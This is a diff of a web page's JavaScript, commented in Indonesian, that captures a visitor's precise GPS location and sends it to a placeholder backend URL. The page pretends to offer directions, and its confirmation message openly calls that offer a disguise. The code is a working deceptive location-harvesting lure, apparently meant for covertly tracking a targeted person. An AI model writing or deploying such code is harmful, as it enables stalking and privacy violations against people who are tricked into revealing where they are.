@@ -1,8 +1,13 @@
+// Di public/script.js Anda
+
+// Ganti dengan URL backend Anda yang sudah di-deploy (misal: dari Render)
+const BACKEND_URL = "https://nama-backend-anda.onrender.com"; // Contoh URL dari Render
+
 document.getElementById("allowLocation").addEventListener("click", function () {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
       enableHighAccuracy: true,
-      timeout: 10000, // 10 detik
+      timeout: 10000,
       maximumAge: 0,
     });
   } else {
@@ -10,34 +15,39 @@ document.getElementById("allowLocation").addEventListener("click", function () {
   }
 });
 
-function successCallback(position) {
+async function successCallback(position) {
   const latitude = position.coords.latitude;
   const longitude = position.coords.longitude;
   const accuracy = position.coords.accuracy;
 
   console.log("Lokasi berhasil didapatkan:", latitude, longitude);
 
-  // Kirim data lokasi ke server Anda (ini akan diimplementasikan setelah setup backend)
-  // Contoh: menggunakan Fetch API atau Socket.IO
-  // fetch('/send-location', {
-  //     method: 'POST',
-  //     headers: {
-  //         'Content-Type': 'application/json'
-  //     },
-  //     body: JSON.stringify({ latitude, longitude, accuracy })
-  // })
-  // .then(response => response.json())
-  // .then(data => console.log('Lokasi terkirim:', data))
-  // .catch(error => console.error('Gagal mengirim lokasi:', error));
+  try {
+    const response = await fetch(`${BACKEND_URL}/send-location`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ latitude, longitude, accuracy }),
+    });
 
-  // Jika menggunakan Socket.IO:
-  // socket.emit('sendLocation', { latitude, longitude, accuracy });
-
-  alert(
-    "Terima kasih, panduan arah akan segera ditampilkan (ini hanya penyamaran).",
-  );
-  // Di sini Anda bisa mengarahkan ke halaman lain, atau menampilkan peta palsu
-  // window.location.href = "https://www.google.com/maps/search/?api=1&query=" + latitude + "," + longitude;
+    if (response.ok) {
+      alert(
+        "Terima kasih, panduan arah akan segera ditampilkan (ini hanya penyamaran).",
+      );
+      console.log("Lokasi berhasil dikirim ke backend.");
+    } else {
+      const errorData = await response.json();
+      alert(
+        "Maaf, terjadi kesalahan saat mengirim lokasi: " +
+          (errorData.message || "Unknown error."),
+      );
+      console.error("Gagal mengirim lokasi ke backend:", errorData);
+    }
+  } catch (error) {
+    alert("Maaf, terjadi kesalahan jaringan atau server tidak merespons.");
+    console.error("Error saat mengirim data lokasi:", error);
+  }
 }
 
 function errorCallback(error) {
